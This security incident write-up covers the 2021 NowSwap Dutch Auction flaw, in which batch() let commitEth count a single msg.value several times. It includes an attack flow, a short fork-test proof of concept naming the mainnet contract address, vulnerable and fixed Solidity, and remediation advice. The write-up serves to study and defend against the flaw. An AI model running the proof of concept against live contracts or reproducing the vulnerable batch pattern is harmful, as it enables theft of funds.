# NowSwap — Dutch Auction batch() Reentrancy Vulnerability Analysis

| Field | Details |
|------|------|
| **Date** | 2021-09-14 |
| **Protocol** | NowSwap (Dutch Auction) |
| **Chain** | Ethereum |
| **Loss** | Address unconfirmed |
| **Attacker** | Address unconfirmed |
| **Attack Tx** | Address unconfirmed (fork block: 13,038,771) |
| **Vulnerable Contract** | [0x4c4564a1FE775D97297F9e3Dc2e762e0Ed5Dda0e](https://etherscan.io/address/0x4c4564a1FE775D97297F9e3Dc2e762e0Ed5Dda0e) (DutchAuction) |
| **Root Cause** | When the batch() function makes multiple calls to the same function (commitEth), state is not updated between each call, allowing duplicate participation |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2021-09/NowSwap_exp.sol) |

---
## 1. Vulnerability Overview

NowSwap's Dutch Auction contract provided a `batch()` function that bundled multiple function calls into a single transaction for execution. By encoding multiple `commitEth()` calls and submitting them through this function, participant state was not updated between each call, allowing an attacker to participate in the auction multiple times with the same ETH or receive duplicate refunds.

---
## 2. Vulnerable Code Analysis

### 2.1 batch() — State Not Updated on Multiple commitEth Calls

```solidity
// ❌ DutchAuction @ 0x4c4564a1FE775D97297F9e3Dc2e762e0Ed5Dda0e
interface IDutchAuction {
    // Participate in auction with ETH
    function commitEth(address payable _beneficiary, bool readAndAgreedToMarketParticipationAgreement)
        external payable;

    // Execute multiple calls in a batch
    function batch(bytes[] calldata calls, bool revertOnFail)
        external payable returns (bool[] memory successes, bytes[] memory results);
}

// commitEth is called multiple times inside batch()
// Total committed amount state is not updated between each commitEth call
// → The same msg.value is counted multiple times
```

**Fixed Code**:
```solidity
// ✅ Prevent reentrancy/duplicate state changes during batch() execution
// ✅ commitEth with nonReentrant + single-call validation

uint256 private _batchDepth;

modifier noBatchReentrant() {
    require(_batchDepth == 0 || msg.sender != address(this), "no batch reentrant");
    _batchDepth++;
    _;
    _batchDepth--;
}

function commitEth(address payable _beneficiary, bool agreed)
    external payable noBatchReentrant
{
    // Update participant commitment with the latest state on every call
    _updateCommitment(_beneficiary, msg.value);
}
```

---
### On-chain Original Code

Source: Bytecode decompilation


**DutchAuction_decompiled.sol** — Related contract (vulnerable function Facet not included):
```solidity
// ❌ Root Cause: When batch() makes multiple calls to the same function (commitEth), state is not updated between each call, allowing duplicate participation
// ⚠️ Source for vulnerable function `batch()` is not present in this file
// (Located in a Diamond pattern Facet or proxy implementation)
// SPDX-License-Identifier: UNLICENSED
// Source unverified — reverse engineered from bytecode
// Original: 0x4c4564a1FE775D97297F9e3Dc2e762e0Ed5Dda0e (Ethereum)
// Reverse engineering method: Function selector extraction + 4byte.directory decoding

pragma solidity ^0.8.0;

contract DutchAuction_Decompiled {
}

```

## 3. Attack Flow

```
┌──────────────────────────────────────────────────────────┐
│ Step 1: Encode multiple commitEth call data              │
│ bytes[] memory calls = new bytes[](N);                   │
│ for(i) calls[i] = abi.encodeCall(commitEth, (this, true))│
└─────────────────────┬────────────────────────────────────┘
                      │
┌─────────────────────▼────────────────────────────────────┐
│ Step 2: DutchAuction.batch(calls, false){value: 100 ETH} │
│ @ 0x4c4564a1FE775D97297F9e3Dc2e762e0Ed5Dda0e            │
│ → commitEth executes N times, same ETH applied per call  │
└─────────────────────┬────────────────────────────────────┘
                      │
┌─────────────────────▼──────────────────────────────────┐
│ Step 3: Acquire participation rights counted as N×100 ETH│
│ or realize ETH profit via duplicate refunds              │
└────────────────────────────────────────────────────────┘
```

---
## 4. PoC Code (DeFiHackLabs)

```solidity
// testExploit() — mainnet fork block 13,038,771
function testExploit() public {
    IDutchAuction auction = IDutchAuction(0x4c4564a1FE775D97297F9e3Dc2e762e0Ed5Dda0e);

    // Encode commitEth call N times
    bytes[] memory calls = new bytes[](5);
    for (uint i = 0; i < 5; i++) {
        calls[i] = abi.encodeWithSelector(
            auction.commitEth.selector,
            payable(address(this)),
            true  // readAndAgreedToMarketParticipationAgreement
        );
    }

    // Execute 5 commitEth calls via batch() with a single deposit of 100 ETH
    auction.batch{value: 100 ether}(calls, false);

    // Receive refund
}

receive() external payable {}
```

---
## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE |
|----|--------|--------|-----|
| V-01 | State not updated on repeated commitEth calls within batch() | CRITICAL | CWE-841 |
| V-02 | msg.value counted multiple times across sub-calls within batch | HIGH | CWE-682 |

---
## 6. Remediation Recommendations

```solidity
// ✅ Clarify ETH distribution logic within batch()
// ✅ Restrict commitEth from being used as a sub-call inside batch

// Note: Solidity's msg.value is shared across delegatecall/call chains
// Each call within batch() must be allocated a separate value

function batch(bytes[] calldata calls, bool revertOnFail, uint256[] calldata values)
    external payable returns (bool[] memory successes, bytes[] memory results)
{
    uint256 totalValue;
    for (uint i = 0; i < values.length; i++) totalValue += values[i];
    require(msg.value == totalValue, "batch: value mismatch");

    for (uint i = 0; i < calls.length; i++) {
        (bool success, bytes memory result) = address(this).call{value: values[i]}(calls[i]);
        // ...
    }
}
```

---
## 7. Lessons Learned

- **The batch() pattern is convenient but creates complex vulnerabilities such as duplicate `msg.value` counting and state update ordering issues.** An explicit value must be allocated to each sub-call.
- **Participant state in the Dutch Auction must be reflected immediately after each commitEth call.** State consistency must be guaranteed even during batch execution.
- **`msg.value` is singular for the entire transaction, so multiple internal calls must not share it.** Value must be allocated separately to each call.